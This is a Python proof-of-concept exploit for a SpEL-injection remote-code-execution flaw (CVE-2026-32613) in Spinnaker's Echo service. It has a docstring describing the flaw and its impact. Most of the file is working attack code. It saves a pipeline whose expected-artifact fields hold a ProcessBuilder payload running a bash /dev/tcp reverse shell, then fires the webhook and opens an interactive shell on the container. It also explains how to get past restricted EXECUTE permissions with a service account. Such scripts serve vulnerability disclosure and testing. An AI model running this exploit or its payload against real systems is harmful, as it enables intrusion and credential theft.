#!/usr/bin/env python3
"""
uv run --no-project --with requests echo_rce_via_spel.py --app APPNAME [OPTIONS]

Finding: Untrusted expectedArtifacts Evaluated as SpEL (RCE)
CVE: CVE-2026-32613
SEVERITY: Critical (10.0)
CWE: CWE-917 (Improper Neutralization of Special Elements used in an
     Expression Language Statement)

SUMMARY:
  Spinnaker pipelines support "expected artifacts" — declarations of
  artifacts a pipeline expects to receive from its trigger. These
  declarations are evaluated using Spring Expression Language (SpEL)
  by the Echo service when a trigger fires. An attacker with write
  access to any application can save a pipeline containing a malicious
  SpEL expression in an expectedArtifact field, then fire the trigger
  (e.g. via a webhook). Echo evaluates the expression with no
  restrictions, giving the attacker arbitrary code execution on the
  Echo service as the process user (typically root).

VULNERABLE CODE:
  echo/echo-pipelinetriggers/src/main/java/.../postprocessors/
  ExpectedArtifactExpressionEvaluationPostProcessor.java, line 47:
    EvaluationContext evaluationContext = new StandardEvaluationContext(inputPipeline);

  StandardEvaluationContext grants full reflective access to the JVM —
  instantiating arbitrary classes, calling any method, accessing the
  filesystem and network. Every other SpEL evaluation point in
  Spinnaker uses a hardened context (AllowListTypeLocator,
  FilteredMethodResolver) that blocks this. This is the only one
  that does not.

IMPACT:
  Any authenticated user with WRITE on an application can achieve Remote
  Code Execution on the Echo service JVM with full OS-level access. This
  enables exfiltration of the process environment, which in production
  Spinnaker deployments typically contains AWS credentials
  (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY), database connection strings,
  service account tokens, and internal service URLs — escalating from code
  execution to full credential theft and lateral movement.

REPRODUCTION:
  1. Save pipeline with SpEL payload in expectedArtifacts via POST /pipelines
  2. Fire the webhook trigger via POST /webhooks/webhook/{source}
  3. Echo evaluates the SpEL — spawns a reverse shell
  4. Attacker gets interactive shell on the Echo container

REQUIREMENTS:
  - Gate accessible (port 8084)
  - Echo running with pipeline trigger processing enabled
  - An application the user has WRITE access to
  - Authentication credentials (one of):
    - Basic auth: --gate-user / --gate-password (LDAP or file-based)
    - Bearer token: --gate-token (OAuth2/OIDC)
    - Session cookie: --gate-cookie (any auth backend, obtain from browser)

EXAMPLES:
  # Unrestricted app — anonymous webhook trigger works:
  uv run --no-project --with requests echo_rce_via_spel.py \\
    --app testapp --gate-user devuser --gate-password devuser123

  # Restricted app — needs a service account with EXECUTE:
  uv run --no-project --with requests echo_rce_via_spel.py \\
    --app targetapp --gate-user devuser --gate-password devuser123 \\
    --run-as-user test-svc-account@managed-service-account
"""

import argparse
import os
import re
import select
import socket
import sys
import termios
import threading
import time
import tty

import requests


def interactive_shell(sock):
    """Bridge stdin/stdout to a socket for an interactive shell session."""
    old_tty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            r, _, _ = select.select([sock, sys.stdin], [], [], 0.5)
            if sock in r:
                data = sock.recv(4096)
                if not data:
                    break
                # Remote bash has no pty — raw \n without \r.
                # Translate so the terminal carriage-returns properly.
                sys.stdout.buffer.write(data.replace(b"\n", b"\r\n"))
                sys.stdout.flush()
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                sock.send(data)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-32613: SpEL RCE via expectedArtifacts in Echo")
    parser.add_argument("--gate-url", default="http://localhost:8084")
    parser.add_argument("--gate-user", default=None, help="Username for basic auth (LDAP/file)")
    parser.add_argument("--gate-password", default=None, help="Password for basic auth")
    parser.add_argument("--gate-token", default=None, help="Bearer token (OAuth2/OIDC)")
    parser.add_argument("--gate-cookie", default=None,
                        help="Session cookie value (e.g. 'SESSION=abc123' from browser)")
    parser.add_argument("--shell-port", type=int, default=9997,
                        help="Local port to listen on for reverse shell (default: 9997)")
    parser.add_argument("--shell-host", default="host.docker.internal",
                        help="Address the Echo container uses to reach this machine "
                             "(default: host.docker.internal for Docker Desktop)")
    parser.add_argument("--run-as-user", default=None,
                        help="Service account to set as runAsUser on the trigger. Required when "
                             "the target app restricts EXECUTE to specific roles, because Gate "
                             "strips caller identity on the webhook path (triggers run as "
                             "'anonymous'). The service account must have EXECUTE on the app.")
    parser.add_argument("--app", required=True,
                        help="Spinnaker application the authenticated user has WRITE access to")
    args = parser.parse_args()

    # Build authenticated session
    session = requests.Session()
    auth_method = "none"
    if args.gate_user:
        session.auth = (args.gate_user, args.gate_password or "")
        auth_method = f"basic ({args.gate_user})"
    if args.gate_token:
        session.headers["Authorization"] = f"Bearer {args.gate_token}"
        auth_method = "bearer token"
    if args.gate_cookie:
        session.headers["Cookie"] = args.gate_cookie
        auth_method = "session cookie"

    print("[*] CVE-2026-32613: SpEL RCE via expectedArtifacts in Echo")
    print(f"[*] Gate: {args.gate_url}")
    print(f"[*] Auth: {auth_method}")
    print()

    # --- Step 1: Verify Gate is up ---
    print("[*] Step 1: Checking Gate...")
    try:
        r = requests.get(f"{args.gate_url}/health", timeout=10)
        print(f"[+] Gate health: {r.json().get('status')}")
    except Exception as e:
        print(f"[-] Gate not accessible: {e}")
        sys.exit(1)

    # --- Step 1b: Check if anonymous can EXECUTE on the target app ---
    # Gate's webhook path (WebhookService) wraps the call to Echo in
    # AuthenticatedRequest.allowAnonymous(), so triggers always run as
    # 'anonymous' regardless of the caller's credentials. If the app
    # restricts EXECUTE, we need a runAsUser on the trigger.
    print()
    print(f"[*] Step 1b: Checking if anonymous can trigger on '{args.app}'...")
    run_as_user = args.run_as_user
    try:
        r = session.get(f"{args.gate_url}/applications/{args.app}", timeout=10)
        if r.status_code == 200:
            app_data = r.json()
            # Gate nests permissions under "attributes", not at the top level
            permissions = app_data.get("attributes", {}).get("permissions", {})
            if not permissions:
                permissions = app_data.get("permissions", {})
            execute_roles = permissions.get("EXECUTE", [])
            if execute_roles:
                print(f"    Application '{args.app}' restricts EXECUTE to: {execute_roles}")
                print(f"    Gate strips caller identity on webhook path (runs as 'anonymous').")
                if run_as_user:
                    print(f"[+] Using --run-as-user '{run_as_user}' to satisfy EXECUTE check")
                else:
                    print()
                    print(f"[-] ERROR: Anonymous cannot trigger pipelines on '{args.app}'.")
                    print(f"    Use --run-as-user with a service account that has EXECUTE permission.")
                    print(f"    Example:")
                    print(f"      --run-as-user test-svc-account@managed-service-account")
                    print()
                    print(f"    Or target an unrestricted application instead.")
                    sys.exit(1)
            else:
                print(f"[+] Application '{args.app}' is unrestricted — anonymous trigger OK")
        elif r.status_code == 404:
            print(f"[-] Application '{args.app}' not found")
            sys.exit(1)
        else:
            print(f"    Could not check app permissions (HTTP {r.status_code}), proceeding anyway")
    except requests.RequestException as e:
        print(f"    Could not check app permissions ({e}), proceeding anyway")

    # --- Step 2: Save pipeline with reverse shell SpEL payload ---
    print()
    print("[*] Step 2: Saving pipeline with SpEL reverse shell payload...")

    shell_cmd = f"bash -i >& /dev/tcp/{args.shell_host}/{args.shell_port} 0>&1"
    spel_payload = (
        "${new java.lang.ProcessBuilder("
        "new String[]{'bash','-c','" + shell_cmd + "'}"
        ").start()}"
    )

    pipeline_name = "spel-rce-test-pipeline"

    # Get existing pipeline ID if it exists, to do an update
    existing_id = None
    try:
        r = session.get(f"{args.gate_url}/applications/{args.app}/pipelineConfigs", timeout=10)
        if r.status_code == 200:
            for p in r.json():
                if p.get("name") == pipeline_name:
                    existing_id = p.get("id")
                    break
    except Exception:
        pass

    pipeline = {
        "name": pipeline_name,
        "application": args.app,
        "expectedArtifacts": [
            {
                "id": "spel-rce-artifact",
                "displayName": spel_payload,
                "matchArtifact": {
                    "type": "embedded/base64",
                    "name": spel_payload,
                },
                "defaultArtifact": {
                    "type": "embedded/base64",
                    "name": "default",
                    "reference": "dGVzdA==",
                },
                "useDefaultArtifact": True,
                "usePriorArtifact": False,
            }
        ],
        "triggers": [
            {
                "type": "webhook",
                "enabled": True,
                "source": "spel-rce-trigger",
                **({"runAsUser": run_as_user} if run_as_user else {}),
            }
        ],
        "stages": [
            {
                "type": "wait",
                "name": "Wait",
                "waitTime": 5,
            }
        ],
    }
    if existing_id:
        pipeline["id"] = existing_id

    print(f"    Pipeline: {pipeline_name}")
    print(f"    SpEL payload: ${{new java.lang.ProcessBuilder(...).start()}}")
    print(f"    Reverse shell: {args.shell_host}:{args.shell_port}")
    if run_as_user:
        print(f"    runAsUser: {run_as_user}")

    r = session.post(f"{args.gate_url}/pipelines", json=pipeline, timeout=30)
    if r.status_code not in (200, 201, 202):
        print(f"[-] Pipeline save failed: {r.status_code} {r.text[:300]}")
        sys.exit(1)
    print("[+] Pipeline saved successfully")

    # --- Step 3: Start listener and fire webhook ---
    print()
    print(f"[*] Step 3: Waiting for Echo cache refresh...")
    time.sleep(10)
    print(f"[+] Starting listener on 0.0.0.0:{args.shell_port}")

    try:
        srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        srv.bind(("::", args.shell_port))
    except OSError:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", args.shell_port))
    srv.listen(1)
    srv.settimeout(90)

    # Fire webhook in a background thread so we can accept() immediately
    def fire_webhooks():
        time.sleep(1)
        for attempt in range(6):
            try:
                session.post(
                    f"{args.gate_url}/webhooks/webhook/spel-rce-trigger",
                    json={"payload": {"test": True}},
                    timeout=10,
                )
            except Exception:
                pass
            time.sleep(15)

    webhook_thread = threading.Thread(target=fire_webhooks, daemon=True)
    webhook_thread.start()
    print("[*] Firing webhook triggers (will retry every 15s for cache refresh)...")

    try:
        conn, addr = srv.accept()
    except socket.timeout:
        print()
        print("[-] No reverse shell connection received after 90s.")
        print("    Possible reasons:")
        print(f"    - Echo container cannot reach {args.shell_host}:{args.shell_port}")
        print("    - bash /dev/tcp not available in the container")
        print("    - SpEL expression was not evaluated (check Echo logs)")
        srv.close()
        sys.exit(1)

    srv.close()

    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    print()
    print("=" * 60)
    print("[+] REMOTE CODE EXECUTION CONFIRMED — Echo service")
    print("=" * 60)
    print()
    print("  You now have a shell on the Echo container.")
    print("  Try: id, env, whoami, cat /etc/os-release")
    print("  Type 'exit' or Ctrl+C to disconnect.")
    print()

    try:
        interactive_shell(conn)
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        print()
        print("[*] Shell closed.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        sys.exit(130)
